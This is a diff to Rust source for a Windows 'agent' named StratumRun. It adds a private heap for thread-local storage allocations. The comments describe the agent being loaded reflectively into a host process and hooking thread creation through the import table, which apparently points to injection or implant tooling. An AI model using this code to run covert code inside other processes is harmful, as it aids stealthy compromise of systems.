@@ -107,6 +107,24 @@ static TLS_TEMPLATE_VA:   std::sync::atomic::AtomicUsize = std::sync::atomic::At
 #[cfg(windows)]
 static TLS_TEMPLATE_SZ:   std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
 
+// Private heap for agent TLS allocations — isolates from host process heap.
+// Initialized by StratumRun via HeapCreate; used by agent_thread_entry and tls_trampoline.
+// Falls back to GetProcessHeap() if not set (standalone EXE path).
+#[cfg(windows)]
+static AGENT_HEAP: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+
+// Returns the agent's private heap, falling back to GetProcessHeap if not initialized.
+#[cfg(windows)]
+unsafe fn agent_heap() -> *mut core::ffi::c_void {
+    let h = AGENT_HEAP.load(std::sync::atomic::Ordering::SeqCst);
+    if h != 0 {
+        h as *mut core::ffi::c_void
+    } else {
+        extern "system" { fn GetProcessHeap() -> *mut core::ffi::c_void; }
+        GetProcessHeap()
+    }
+}
+
 // Trampoline: each spawned thread runs this first to init its own TLS,
 // then calls the real entry point. Passed via heap-allocated TrampolineArgs.
 #[cfg(windows)]
@@ -171,14 +189,13 @@ unsafe extern "system" fn tls_trampoline(param: *mut std::ffi::c_void) -> u32 {
                 OutputDebugStringA(msg.as_ptr());
             }
         } else {
-            // Use HeapAlloc directly — bypasses the Rust allocator runtime entirely.
-            // std::alloc in a newly-created thread (before TLS is set up) can corrupt
-            // heap metadata because the Rust allocator may touch thread-local state.
+            // Use HeapAlloc on agent's private heap — bypasses the Rust allocator
+            // and isolates from the host process heap (avoids heap corruption when
+            // loaded reflectively into a process with its own active CRT).
             extern "system" {
                 fn HeapAlloc(heap: *mut core::ffi::c_void, flags: u32, bytes: usize) -> *mut core::ffi::c_void;
-                fn GetProcessHeap() -> *mut core::ffi::c_void;
             }
-            let tls_block = HeapAlloc(GetProcessHeap(), 0x08 /* HEAP_ZERO_MEMORY */, template_sz)
+            let tls_block = HeapAlloc(agent_heap(), 0x08 /* HEAP_ZERO_MEMORY */, template_sz)
                 as *mut u8;
         if !tls_block.is_null() {
             // Block is already zeroed by HEAP_ZERO_MEMORY.
@@ -358,10 +375,24 @@ pub unsafe extern "system" fn StratumRun(
             tid:   *mut u32,
         ) -> *mut std::ffi::c_void;
         fn Sleep(ms: u32);
+        fn HeapCreate(options: u32, initial_size: usize, max_size: usize) -> *mut std::ffi::c_void;
     }
 
     #[cfg(stratum_debug)]
     { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] entered\0".as_ptr()); }
+
+    // Create a private heap for all agent TLS allocations.
+    // Isolates from the host process heap — prevents heap corruption when
+    // loaded reflectively into a process with its own active CRT.
+    let private_heap = HeapCreate(0, 0, 0);
+    if !private_heap.is_null() {
+        AGENT_HEAP.store(private_heap as usize, std::sync::atomic::Ordering::SeqCst);
+        #[cfg(stratum_debug)]
+        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] private heap created\0".as_ptr()); }
+    } else {
+        #[cfg(stratum_debug)]
+        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] HeapCreate failed, using process heap\0".as_ptr()); }
+    }
 
     // Publish TLS info for StratumCreateThread so it can inject TLS into every
     // new thread spawned by reqwest/tokio/std (they all go through our IAT hook).
@@ -400,7 +431,6 @@ pub unsafe extern "system" fn StratumRun(
         if !blk.is_null() {
             extern "system" {
                 fn HeapAlloc(heap: *mut std::ffi::c_void, flags: u32, bytes: usize) -> *mut std::ffi::c_void;
-                fn GetProcessHeap() -> *mut std::ffi::c_void;
             }
             let addr_of_index    = *blk.add(0) as *const u32;
             let _tls_template_va = *blk.add(1) as *const u8; // not used — zero-init only
@@ -429,8 +459,7 @@ pub unsafe extern "system" fn StratumRun(
                     let _ = slot_str;
                     OutputDebugStringA(buf.as_ptr());
                 }
-                let heap = GetProcessHeap();
-                let tls_block = HeapAlloc(heap, 0x08 /* HEAP_ZERO_MEMORY */, tls_template_sz);
+                let tls_block = HeapAlloc(agent_heap(), 0x08 /* HEAP_ZERO_MEMORY */, tls_template_sz);
                 if !tls_block.is_null() {
                     #[cfg(stratum_debug)]
                     { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: HeapAlloc ok (zero, no template copy)\0".as_ptr()); }
